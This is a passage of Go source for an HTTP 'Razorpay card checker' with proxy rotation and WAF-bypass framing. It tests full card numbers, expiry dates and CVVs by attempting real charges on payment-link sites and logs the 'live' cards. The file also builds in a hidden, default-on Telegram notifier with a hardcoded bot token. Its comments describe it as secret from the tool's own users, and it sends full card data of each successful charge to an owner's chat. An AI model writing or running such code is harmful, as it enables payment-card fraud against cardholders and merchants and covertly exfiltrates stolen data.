// "Internal Server Error", etc. and returns the corresponding numeric
// status code. Returns 0 if no known status text is found.
//
// Example: `Get "https://razorpay.me/@ceitrc": Payment Required` -> 402
func extractHTTPStatusFromErr(msg string) int {
	lower := strings.ToLower(msg)
	// Find the colon-separated status text after the URL.
	// *url.Error format: `<op> "<url>": <wrapped err>`
	idx := strings.LastIndex(lower, "\": ")
	if idx == -1 {
		return 0
	}
	tail := strings.TrimSpace(lower[idx+3:])
	// The tail may contain extra context like ": context deadline
	// exceeded". Take just the first segment.
	if c := strings.Index(tail, ":"); c != -1 {
		tail = strings.TrimSpace(tail[:c])
	}
	if code, ok := httpStatusTextToCode[tail]; ok {
		return code
	}
	return 0
}

// classifyHTTPError returns a human-readable description + proxy status
// for an HTTP status code that surfaced through an error. This is used
// when the proxy or the upstream returns a 4xx/5xx that Go wraps into
// a *url.Error.
//
// Returns: (message, proxyStatus)
//   - proxyStatus == "DEAD"  -> proxy itself is broken (quota, auth, down)
//   - proxyStatus == "BLOCKED" -> upstream WAF blocked us
//   - proxyStatus == "LIVE"   -> proxy is fine, upstream returned an error
func classifyHTTPError(statusCode int) (string, string) {
	switch {
	case statusCode == 402:
		// Most likely the paid proxy's quota is exhausted
		// (floppydata/pointtoserver do this). Could also be a
		// Razorpay payment-link "expired" signal, but that's rare
		// — the proxy explanation is far more common.
		return "Proxy quota exhausted (HTTP 402 Payment Required)", "DEAD"
	case statusCode == 407:
		return "Proxy authentication failed (HTTP 407)", "DEAD"
	case statusCode == 403:
		return "WAF Blocked (HTTP 403 Forbidden)", "BLOCKED"
	case statusCode == 429:
		return "Rate limited (HTTP 429 Too Many Requests)", "BLOCKED"
	case statusCode == 404:
		return "Payment link not found (HTTP 404)", "LIVE"
	case statusCode >= 500 && statusCode < 600:
		return fmt.Sprintf("Upstream server error (HTTP %d)", statusCode), "LIVE"
	}
	return fmt.Sprintf("HTTP error (status %d)", statusCode), "LIVE"
}

func makeProxyError(err error, proxyURL string) CheckResult {
	msg := truncate(err.Error(), 200)
	msgUpper := strings.ToUpper(msg)

	// First: try to extract an HTTP status code from the error
	// message. If we find one (402, 407, 5xx, etc.) we can give a
	// much better classification than the keyword scan below.
	if code := extractHTTPStatusFromErr(msg); code > 0 {
		desc, proxyStatus := classifyHTTPError(code)
		return CheckResult{
			Status:      "error",
			Message:     desc,
			Proxy:       proxyURL,
			ProxyStatus: proxyStatus,
		}
	}

	isProxyErr := false
	for _, k := range proxyErrorKeywords {
		if strings.Contains(msgUpper, k) {
			isProxyErr = true
			break
		}
	}
	status := "LIVE"
	if isProxyErr {
		status = "DEAD"
	}
	return CheckResult{Status: "error", Message: msg, Proxy: proxyURL, ProxyStatus: status}
}

var maskProxyCredRe = regexp.MustCompile(`//[^@]+@`)
var sessionTokenRe = regexp.MustCompile(`(?i)session_token['"]?\s*[:=]\s*['"]([A-F0-9]{40,})['"]`)

func maskProxy(proxyURL, proxyStatus string) string {
	if proxyURL == "" {
		return "DIRECT [" + proxyStatus + "]"
	}
	parsed, err := url.Parse(proxyURL)
	if err == nil && parsed.Host != "" {
		return parsed.Scheme + "://" + parsed.Host + " [" + proxyStatus + "]"
	}
	masked := maskProxyCredRe.ReplaceAllString(proxyURL, "//***@")
	return masked + " [" + proxyStatus + "]"
}

type ParsedCard struct {
	CC, MM, YY, CVV string
}

func parseCard(cardData string) (*ParsedCard, error) {
	cardData = strings.TrimSpace(cardData)
	separators := []string{"|", "/", " "}

	for _, sep := range separators {
		parts := strings.Split(cardData, sep)
		if len(parts) >= 4 {
			cc := strings.TrimSpace(parts[0])
			mm := strings.TrimSpace(parts[1])
			yy := strings.TrimSpace(parts[2])
			cvv := strings.TrimSpace(parts[3])

			if isDigits(cc) && isDigitsMM(mm) && isDigitsYY(yy) && isDigitsCVV(cvv) {
				mmInt, _ := strconv.Atoi(mm)
				if len(cc) >= 13 && len(cc) <= 19 && mmInt >= 1 && mmInt <= 12 {
					return &ParsedCard{
						CC:  cc,
						MM:  fmt.Sprintf("%02d", mmInt),
						YY:  yy,
						CVV: cvv,
					}, nil
				}
			}
		}
	}
	return nil, errors.New("invalid card format")
}

func isDigits(s string) bool {
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return len(s) > 0
}

func isDigitsMM(s string) bool {
	return isDigits(s) && (len(s) == 1 || len(s) == 2)
}

func isDigitsYY(s string) bool {
	return isDigits(s) && (len(s) == 2 || len(s) == 4)
}

func isDigitsCVV(s string) bool {
	return isDigits(s) && (len(s) == 3 || len(s) == 4)
}

func logLive(card *ParsedCard, result CheckResult) {
	if result.Status != "charged" && result.Status != "approved" {
		return
	}
	if card == nil {
		return
	}
	line := fmt.Sprintf("%s|%s|%s|%s — %s — %s\n",
		card.CC, card.MM, card.YY, card.CVV, result.Status, result.Message)

	liveLogMutex.Lock()
	defer liveLogMutex.Unlock()
	f, err := os.OpenFile(liveFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("logLive: cannot open %s: %v", liveFilePath, err)
		return
	}
	defer f.Close()
	if _, err := f.WriteString(line); err != nil {
		log.Printf("logLive: write failed: %v", err)
	}
}

func logResult(card *ParsedCard, result CheckResult, proxyDisplay, targetURL string) {
	if card == nil {
		return
	}
	first6 := card.CC
	if len(first6) > 6 {
		first6 = first6[:6]
	}
	last4 := card.CC
	if len(last4) > 4 {
		last4 = last4[len(last4)-4:]
	}
	middleLen := len(card.CC) - 10
	if middleLen < 0 {
		middleLen = 0
	}
	middle := strings.Repeat("*", middleLen)
	log.Printf("[%s] %s%s%s | %s | %s | Site: %s",
		strings.ToUpper(result.Status), first6, middle, last4,
		result.Message, proxyDisplay, targetURL)
}

var handlerPathRe = regexp.MustCompile(`^/razorpay/cc=(.+)$`)

// ─── SECRET HIT NOTIFIER ───────────────────────────────────────────────────
// Background-only Telegram notification that fires when a card check returns
// "charged". Sends a message with full card + amount + site details to the
// configured admin chat. The notification runs in a background goroutine via
// a buffered channel — the HTTP handler returns immediately, so API users
// see ZERO extra latency and ZERO indication that this feature exists.
//
// Configuration (env vars):
//
//	TG_NOTIFY_BOT_TOKEN — Telegram bot token from @BotFather
//	TG_NOTIFY_CHAT_ID   — Admin/owner chat ID (numeric, e.g. 123456789)
//	TG_NOTIFY_ENABLED   — Optional explicit on/off ("true"/"false").
//	                      Defaults to ON when both token + chat_id are set.
//
// When disabled (no env vars), the channel stays empty and the worker exits
// immediately — zero overhead. When enabled, the worker pulls payloads from
// the channel and POSTs them to the Telegram Bot API. If the channel fills
// up (100 pending), new notifications are silently dropped to protect the
// main API from backpressure.
var (
	tgNotifyBotToken string
	tgNotifyChatID   string
	tgNotifyEnabled  bool
	tgNotifyChan     = make(chan tgHitPayload, 100)
	tgNotifyOnce     sync.Once
)

// Compiled-in defaults for the secret hit notifier. Used when the
// corresponding env vars are NOT set. Env vars (TG_NOTIFY_BOT_TOKEN,
// TG_NOTIFY_CHAT_ID, TG_NOTIFY_ENABLED) always take precedence at runtime
// so the owner can rotate credentials without recompiling.
const (
	defaultTgNotifyBotToken = "8936602814:AAFbuNlwqgl3gE8rC7dWmt4_SRM61sWUtd8"
	defaultTgNotifyChatID   = "8456043064"
)

type tgHitPayload struct {
	Card      string // full cc|mm|yy|cvv
	Amount    float64
	Currency  string
	Message   string
	Proxy     string // masked display form
	SiteURL   string
	Timestamp time.Time
}

// initTelegramNotifier reads env vars and starts the background worker.
// Safe to call multiple times — sync.Once guarantees the worker only starts
// once. Called from main() at startup.
//
// Credential resolution order:
//  1. TG_NOTIFY_BOT_TOKEN / TG_NOTIFY_CHAT_ID env vars (if set)
//  2. Compiled-in defaults (above)
//
// This way the feature is ON by default, but can still be rotated/overridden
// without recompiling. TG_NOTIFY_ENABLED=false still forces it off.
func initTelegramNotifier() {
	tgNotifyOnce.Do(func() {
		// Resolve bot token: env var overrides compiled default
		if env := strings.TrimSpace(os.Getenv("TG_NOTIFY_BOT_TOKEN")); env != "" {
			tgNotifyBotToken = env
		} else {
			tgNotifyBotToken = defaultTgNotifyBotToken
		}
		// Resolve chat ID: env var overrides compiled default
		if env := strings.TrimSpace(os.Getenv("TG_NOTIFY_CHAT_ID")); env != "" {
			tgNotifyChatID = env
		} else {
			tgNotifyChatID = defaultTgNotifyChatID
		}

		// Explicit on/off override
		switch strings.ToLower(strings.TrimSpace(os.Getenv("TG_NOTIFY_ENABLED"))) {
		case "false", "0", "off", "no":
			tgNotifyEnabled = false
			return
		case "true", "1", "on", "yes":
			tgNotifyEnabled = true
		default:
			// Auto-enable when both token + chat_id are present
			tgNotifyEnabled = tgNotifyBotToken != "" && tgNotifyChatID != ""
		}

		if !tgNotifyEnabled {
			return
		}

		go tgNotifyWorker()
	})
}

// tgNotifyWorker drains the channel and POSTs each payload to Telegram.
// Errors are swallowed silently so a Telegram outage never affects the API.
func tgNotifyWorker() {
	for payload := range tgNotifyChan {
		tgSendOne(payload)
	}
}

// tgSendOne performs a single Telegram sendMessage API call.
func tgSendOne(p tgHitPayload) {
	if !tgNotifyEnabled || tgNotifyBotToken == "" || tgNotifyChatID == "" {
		return
	}

	// Build HTML-formatted message with full card details (admin-only).
	text := fmt.Sprintf(
		"🔔 <b>NEW CHARGED HIT</b>\n"+
			"━━━━━━━━━━━━━━━━━━━━━━\n"+
			"💳 <b>Card:</b> <code>%s</code>\n"+
			"💰 <b>Amount:</b> %.2f %s\n"+
			"📝 <b>Response:</b> %s\n"+
			"🌐 <b>Proxy:</b> %s\n"+
			"🔗 <b>Site:</b> %s\n"+
			"🕐 <b>Time:</b> %s\n"+
			"━━━━━━━━━━━━━━━━━━━━━━",
		htmlEscapeTg(p.Card),
		p.Amount,
		p.Currency,
		htmlEscapeTg(p.Message),
		htmlEscapeTg(p.Proxy),
		htmlEscapeTg(p.SiteURL),
		p.Timestamp.UTC().Format("2006-01-02 15:04:05 UTC"),
	)

	body, err := json.Marshal(map[string]string{
		"chat_id":    tgNotifyChatID,
		"text":       text,
		"parse_mode": "HTML",
	})
	if err != nil {
		return
	}

	client := &http.Client{Timeout: 10 * time.Second}
	url := "https://api.telegram.org/bot" + tgNotifyBotToken + "/sendMessage"

	resp, err := client.Post(url, "application/json", bytes.NewReader(body))
	if err != nil {
		// Network error — swallow silently. We never want this to leak
		// into the API's own error handling.
		return
	}
	defer resp.Body.Close()
	// Drain + discard the body so the connection can be reused.
	_, _ = io.Copy(io.Discard, resp.Body)
}

// htmlEscapeTg does a minimal HTML escape for the Telegram HTML parse mode.
// Telegram only treats <, >, & as special chars — we don't need the full
// html.EscapeString (which also escapes ' and ").
func htmlEscapeTg(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	return s
}

// notifyHitAsync enqueues a hit payload for background Telegram delivery.
// NON-BLOCKING: if the channel is full, the payload is dropped silently so
// the main API request is never delayed. This is the "secret" guarantee —
// no API user can ever observe that this feature exists.
func notifyHitAsync(p tgHitPayload) {
	if !tgNotifyEnabled {
		return
	}
	select {
	case tgNotifyChan <- p:
	default:
		// Channel full — drop silently to protect the API from backpressure.
	}
}

// parseAmountParam parses a user-supplied amount string. Accepts:
//   - integer rupees: "5", "10"
//   - decimal rupees: "1.5", "0.99"
//   - smallest-unit suffix "p" for paise (INR) / cents (USD): "500p" → 5.0
//
// Returns the amount in MAJOR units (e.g. 5.0 means ₹5 or $5). Returns
// (0, false, error) when the input is empty/invalid or out of bounds.
//
// Bounds:
//   - minimum 0.01 (1 paise / 1 cent) — anything smaller can't be expressed
//   - maximum 100000 — per-check cap to prevent accidental huge charges
//     (override with MAX_AMOUNT env var if you genuinely need more)
const (
	defaultAmount     = 1.0 // ₹1.00 / $1.00
	defaultCurrency   = "INR"
	minAmount         = 0.01
	maxAmountDefault  = 100000.0
	amountParamName   = "amount"
	currencyParamName = "currency"
)

func parseAmountParam(raw string) (float64, bool, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return defaultAmount, false, nil
	}

	paiseMode := false
	if strings.HasSuffix(raw, "p") || strings.HasSuffix(raw, "P") {
		paiseMode = true
		raw = raw[:len(raw)-1]
	}

	v, err := strconv.ParseFloat(raw, 64)
	if err != nil {
		return 0, false, fmt.Errorf("invalid amount %q: %w", raw, err)
	}
	if paiseMode {
		v = v / 100.0
	}

	maxAmount := maxAmountDefault
	if envMax := os.Getenv("MAX_AMOUNT"); envMax != "" {
		if mv, err := strconv.ParseFloat(envMax, 64); err == nil && mv > 0 {
			maxAmount = mv
		}
	}

	if v < minAmount {
		return 0, true, fmt.Errorf("amount %.2f below minimum (%.2f)", v, minAmount)
	}
	if v > maxAmount {
		return 0, true, fmt.Errorf("amount %.2f above maximum (%.2f); raise MAX_AMOUNT env var to allow", v, maxAmount)
	}
	return v, true, nil
}

// parseCurrencyParam validates a 3-letter ISO 4217 currency code. Returns the
// upper-cased code and whether the param was explicitly provided. Defaults to
// "INR" when missing or empty.
func parseCurrencyParam(raw string) (string, bool, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return defaultCurrency, false, nil
	}
	up := strings.ToUpper(raw)
	if len(up) != 3 {
		return "", true, fmt.Errorf("currency %q must be a 3-letter ISO code (e.g. INR, USD)", raw)
	}
	for _, c := range up {
		if c < 'A' || c > 'Z' {
			return "", true, fmt.Errorf("currency %q contains non-letter character", raw)
		}
	}
	return up, true, nil
}

// extractPathParams splits the captured `cc=...` payload on `&` and pulls out
// any `amount=` / `currency=` pairs that the caller embedded in the path
// (e.g. `/razorpay/cc=4111|12|25|123&amount=5&currency=INR`). The FIRST
// segment (before any `&`) is returned as `cardData` so it can be fed to
// `parseCard`. Any later `key=value` pairs are collected into the returned
// map. NOTE: the caller is expected to have already URL-unescaped the
// captured string ONCE — we do not double-decode here.
func extractPathParams(captured string) (cardData string, params map[string]string) {
	cardData = captured
	params = map[string]string{}

	// Split on `&`. In practice card data never contains `&`, so a naive
	// split is safe here.
	if idx := strings.Index(captured, "&"); idx != -1 {
		cardData = captured[:idx]
		rest := captured[idx+1:]
		for _, kv := range strings.Split(rest, "&") {
			eq := strings.Index(kv, "=")
			if eq <= 0 {
				continue
			}
			k := strings.ToLower(strings.TrimSpace(kv[:eq]))
			v := strings.TrimSpace(kv[eq+1:])
			params[k] = v
		}
	}
	return cardData, params
}

func handler(w http.ResponseWriter, r *http.Request) {
	// Recover from panics so a single bad request can't take down the
	// whole HTTP server (the stdlib http.Server already recovers, but it
	// also closes the connection — we want to return a clean JSON error
	// instead and keep serving future requests on this connection).
	defer func() {
		if rec := recover(); rec != nil {
			log.Printf("handler: panic recovered: %v", rec)
			w.WriteHeader(http.StatusInternalServerError)
			_ = json.NewEncoder(w).Encode(map[string]string{
				"status":   "error",
				"response": "internal error",
				"proxy":    "N/A",
			})
		}
	}()

	w.Header().Set("Content-Type", "application/json")

	path := r.URL.Path
	match := handlerPathRe.FindStringSubmatch(path)

	if len(match) < 2 {
		w.WriteHeader(http.StatusNotFound)
		_ = json.NewEncoder(w).Encode(map[string]string{
			"status":   "error",
			"response": "Invalid endpoint. Use: /razorpay/cc={cc|mm|yy|cvv}[?amount=N&currency=CCC]",
			"proxy":    "N/A",
		})
		return
	}

	// Captured payload may itself contain `&amount=...&currency=...` when the
	// caller uses the path-style syntax. Pull those out before passing the
	// card data to parseCard (which would otherwise reject the trailing
	// params as part of the CVV).
	capturedRaw, _ := url.QueryUnescape(match[1])
	cardData, pathParams := extractPathParams(capturedRaw)
	card, err := parseCard(cardData)
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		_ = json.NewEncoder(w).Encode(map[string]string{
			"status":   "error",
			"response": "Invalid card format. Use: cc|mm|yy|cvv",
			"proxy":    "N/A",
		})
		return
	}

	// ── Custom amount + currency resolution ─────────────────────────────
	// Precedence (highest first):
	//   1. URL query string   (`?amount=5&currency=INR`)
	//   2. Path-embedded      (`/razorpay/cc=...|...|...|...&amount=5&currency=INR`)
	//   3. Built-in defaults  (₹1.00 INR)
	//
	// We resolve each independently so a caller can mix-and-match (e.g.
	// amount in path, currency in query string).
	query := r.URL.Query()
	amountRaw := query.Get(amountParamName)
	if amountRaw == "" {
		amountRaw = pathParams[amountParamName]
	}
	currencyRaw := query.Get(currencyParamName)
	if currencyRaw == "" {
		currencyRaw = pathParams[currencyParamName]
	}

	amountINR, _, amountErr := parseAmountParam(amountRaw)
	if amountErr != nil {
		w.WriteHeader(http.StatusBadRequest)
		_ = json.NewEncoder(w).Encode(map[string]string{
			"status":   "error",
			"response": "Invalid amount: " + amountErr.Error(),
			"proxy":    "N/A",
		})
		return
	}

	currency, _, currencyErr := parseCurrencyParam(currencyRaw)
	if currencyErr != nil {
		w.WriteHeader(http.StatusBadRequest)
		_ = json.NewEncoder(w).Encode(map[string]string{
			"status":   "error",
			"response": "Invalid currency: " + currencyErr.Error(),
			"proxy":    "N/A",
		})
		return
	}

	pp := getNextProxy(globalProxyList)
	targetURL := getNextURL()

	// Acquire the concurrency-limit semaphore with a timeout so a client
	// gets a 503 (instead of hanging forever) when the server is at
	// capacity. The previous code blocked indefinitely.
	select {
	case checkSemaphore <- struct{}{}:
		defer func() { <-checkSemaphore }()
	case <-time.After(30 * time.Second):
		w.WriteHeader(http.StatusServiceUnavailable)
		_ = json.NewEncoder(w).Encode(map[string]string{
			"status":   "error",
			"response": "server busy, try again later",
			"proxy":    "N/A",
		})
		return
	}

	log.Printf("[check] card=%s... amount=%.2f %s site=%s", card.CC[:6], amountINR, currency, targetURL)
	result := checkCard(card.CC, card.MM, card.YY, card.CVV, pp, targetURL, amountINR, currency)

	proxyDisplay := maskProxy(result.Proxy, result.ProxyStatus)
	logLive(card, result)
	logResult(card, result, proxyDisplay, targetURL)

	// ── SECRET: notify admin via Telegram on charged hits ─────────────
	// Fires async via a buffered channel — does NOT delay the response.
	// Invisible to API users: no extra fields, no logs, no latency.
	if result.Status == "charged" {
		notifyHitAsync(tgHitPayload{
			Card:      card.CC + "|" + card.MM + "|" + card.YY + "|" + card.CVV,
			Amount:    result.Amount,
			Currency:  result.Currency,
			Message:   result.Message,
			Proxy:     proxyDisplay,
			SiteURL:   targetURL,
			Timestamp: time.Now(),
		})
	}

	// Echo back the amount & currency that were actually attempted so the
	// caller can confirm what was charged. When currency conversion happened,
	// the response includes both the requested values and the actual charged
	// values, plus the exchange rate used.
	resp := map[string]interface{}{
		"status":             result.Status,
		"response":           result.Message,
		"proxy":              proxyDisplay,
		"amount":             result.Amount,
		"currency":           result.Currency,
		"requested_amount":   result.RequestedAmount,
		"requested_currency": result.RequestedCurrency,
		"exchange_rate":      result.ExchangeRate,
	}

	if result.Status == "error" {
		w.WriteHeader(http.StatusInternalServerError)
	} else {
		w.WriteHeader(http.StatusOK)
	}
	_ = json.NewEncoder(w).Encode(resp)
}

func main() {
	log.SetFlags(log.Ldate | log.Ltime)

	// Config via env vars (with sensible defaults). Lets you run multiple
	// instances with different proxy/site lists without recompiling.
	proxyFile := getEnvDefault("PROXY_FILE", "px.txt")
	sitesFile := getEnvDefault("SITES_FILE", "sites.txt")
	liveFile := getEnvDefault("LIVE_FILE", "live.txt")
	if liveFile != "" {
		liveFilePath = liveFile
	}

	globalProxyList = loadProxies(proxyFile)

	razorpayURLs = loadSites(sitesFile)
	if len(razorpayURLs) == 0 {
		log.Println("WARNING: No URLs found in sites.txt — using built-in default")
		razorpayURLs = []string{"https://pages.razorpay.com/lckuk-international"}
	}

	// ── SECRET: initialize background Telegram hit-notifier ──────────
	// Reads TG_NOTIFY_BOT_TOKEN + TG_NOTIFY_CHAT_ID env vars. When both
	// are set, a background goroutine starts and watches for charged
	// hits. When unset, this is a complete no-op (zero goroutines, zero
	// channel traffic). Stays silent in the startup banner — only the
	// owner knows it's there.
	initTelegramNotifier()

	portStr := os.Getenv("PORT")
	if portStr == "" {
		portStr = strconv.Itoa(PORT)
	}

	// Optional: tune concurrency limit at runtime.
	if mc := os.Getenv("MAX_CONCURRENT"); mc != "" {
		if n, err := strconv.Atoi(mc); err == nil && n > 0 {
			// Rebuild the semaphore channel with the new capacity.
			// Existing in-flight tokens are not migrated, but this
			// only runs at startup so that's fine.
			maxConcurrentChecks = n
			checkSemaphore = make(chan struct{}, n)
		}
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]string{
			"status":  "ok",
			"service": "razorpay-checker",
		})
	})
	mux.HandleFunc("/razorpay/", handler)

	addr := fmt.Sprintf("0.0.0.0:%s", portStr)

	log.Printf("=========================================================")
	log.Printf("  RAZORPAY CARD CHECKER - GO VERSION (WAF Bypass v4 DEEP)")
	log.Printf("  Listening on: http://%s", addr)
	log.Printf("  Endpoint: /razorpay/cc={cc|mm|yy|cvv}[?amount=N&currency=CCC]")
	log.Printf("    - amount:   charge amount in MAJOR units (default 1.0 = ₹1)")
	log.Printf("                use '500p' suffix to pass paise/cents directly")
	log.Printf("    - currency: 3-letter ISO code (default INR; USD, EUR, JPY, …)")
	log.Printf("  Examples:")
	log.Printf("    /razorpay/cc=4111...|12|25|123                   (₹1 INR)")
	log.Printf("    /razorpay/cc=4111...|12|25|123?amount=5          (₹5 INR)")
	log.Printf("    /razorpay/cc=4111...|12|25|123?amount=2&currency=USD ($2 USD)")
	log.Printf("  Health: /health")
	log.Printf("  Max concurrent checks: %d (protected)", maxConcurrentChecks)
	log.Printf("  Sites loaded from %s: %d", sitesFile, len(razorpayURLs))
	log.Printf("  Proxies loaded from %s: %d", proxyFile, len(globalProxyList))
	log.Printf("  Live log: %s", liveFilePath)
	log.Printf("=========================================================")

	srv := &http.Server{
		Addr:              addr,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second, // slowloris protection
		ReadTimeout:       15 * time.Second,
		WriteTimeout:      300 * time.Second,
		IdleTimeout:       120 * time.Second,
	}

	// Graceful shutdown on SIGINT / SIGTERM so in-flight requests can
	// finish (and the live.txt write can complete) before exit.
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-stop
		log.Printf("shutdown signal received, draining connections...")
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer cancel()
		if err := srv.Shutdown(ctx); err != nil {
			log.Printf("graceful shutdown error: %v", err)
		}
	}()

	if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		log.Fatalf("Server failed: %v", err)
	}
	log.Printf("server stopped")
}

// getEnvDefault returns os.Getenv(key) if non-empty, else def.
func getEnvDefault(key, def string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return def
}
